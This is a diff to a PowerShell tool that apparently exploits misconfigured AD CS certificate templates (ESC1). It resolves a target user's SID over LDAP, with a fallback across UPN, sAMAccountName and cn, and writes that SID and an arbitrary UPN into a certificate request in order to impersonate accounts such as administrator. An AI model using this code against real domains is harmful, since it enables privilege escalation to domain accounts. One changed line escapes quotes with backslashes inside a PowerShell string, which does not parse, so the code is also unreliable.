@@ -329,19 +329,52 @@ function Resolve-TargetUserSid {
     }
 
     $escapedIdentity = $Identity.Replace('\', '\5c').Replace('*', '\2a').Replace('(', '\28').Replace(')', '\29')
-    if ($escapedIdentity -like '*@*') {
-        $filter = "(&(objectClass=user)(userPrincipalName=$escapedIdentity))"
-    }
-    else {
-        $filter = "(&(objectClass=user)(|(sAMAccountName=$escapedIdentity)(cn=$escapedIdentity)))"
+    $queries = @(
+        "(&(objectClass=user)(userPrincipalName=$escapedIdentity))",
+        "(&(objectClass=user)(sAMAccountName=$escapedIdentity))",
+        "(&(objectClass=user)(cn=$escapedIdentity))"
+    )
+
+    $upnUserPart = $null
+    if ($Identity -like '*@*') {
+        $parts = $Identity.Split('@', 2)
+        $upnUserPart = $parts[0]
+        if (-not [string]::IsNullOrWhiteSpace($upnUserPart)) {
+            $escapedUserPart = $upnUserPart.Replace('\', '\5c').Replace('*', '\2a').Replace('(', '\28').Replace(')', '\29')
+            $queries += "(&(objectClass=user)(sAMAccountName=$escapedUserPart))"
+            $queries += "(&(objectClass=user)(userPrincipalName=$escapedUserPart@*))"
+        }
     }
 
-    $searcher = Get-LdapSearcher -BaseDn $defaultNamingContext -Filter $filter -Properties @('objectSid', 'distinguishedName', 'userPrincipalName', 'sAMAccountName') -Server $LdapServer -Credential $LdapCredential
-    $result = $searcher.FindOne()
-    if (-not $result) {
-        throw "Could not resolve a unique AD user object for '$Identity'."
+    $results = @()
+    foreach ($filter in $queries | Select-Object -Unique) {
+        $searcher = Get-LdapSearcher -BaseDn $defaultNamingContext -Filter $filter -Properties @('objectSid', 'distinguishedName', 'userPrincipalName', 'sAMAccountName') -Server $LdapServer -Credential $LdapCredential
+        $found = @($searcher.FindAll())
+        if ($found.Count -gt 0) {
+            $results = $found
+            if ($filter -ne $queries[0]) {
+                Write-Warn "No exact UPN match for '$Identity'. Falling back to filter: $filter"
+            }
+            break
+        }
     }
 
+    if ($results.Count -eq 0) {
+        throw "No AD user object matched '$Identity'. Verify spelling (for example: administrator@officialcyberlab.local)."
+    }
+
+    if ($results.Count -gt 1) {
+        $preview = $results |
+            Select-Object -First 5 |
+            ForEach-Object {
+                $upn = if ($_.Properties['userprincipalname'].Count) { [string]$_.Properties['userprincipalname'][0] } else { '<no upn>' }
+                $sam = if ($_.Properties['samaccountname'].Count) { [string]$_.Properties['samaccountname'][0] } else { '<no sam>' }
+                "$upn (sAMAccountName=$sam)"
+            }
+        throw "Identity '$Identity' matched multiple users: $($preview -join '; '). Please provide an exact UPN."
+    }
+
+    $result = $results[0]
     $sidBytes = if ($result.Properties['objectsid'].Count) { [byte[]]$result.Properties['objectsid'][0] } else { $null }
     $sid = Convert-ObjectSidToString -SidBytes $sidBytes
     if (-not $sid) {
@@ -387,7 +420,12 @@ _continue_ = "upn={1}"
 CertificateTemplate = {0}
 '@
 
-    $sidLine = if ([string]::IsNullOrWhiteSpace($TargetSid)) { '' } else { '_continue_ = "URL=tag:microsoft.com,2022-09-14:sid:{2}"' }
+    $sidLine = if ([string]::IsNullOrWhiteSpace($TargetSid)) {
+        ""
+    }
+    else {
+        "_continue_ = \"URL=tag:microsoft.com,2022-09-14:sid:$TargetSid\""
+    }
 
     return ($infTemplate -f $TemplateName, $TargetSan, $TargetSid, $sidLine)
 }
@@ -418,7 +456,7 @@ function Invoke-ESC1Exploitation {
 
     $targetSanValue = $TargetUserSAN
     $targetSidValue = Resolve-TargetUserSid -Identity $targetSanValue -LdapServer $Config.LdapServer -LdapCredential $Config.LdapCredential
-    
+
     Write-Info "Using template: $($template.Name)"
     Write-Info "Using CA: $selectedCa"
     Write-Info "Target SAN/UPN: $targetSanValue"
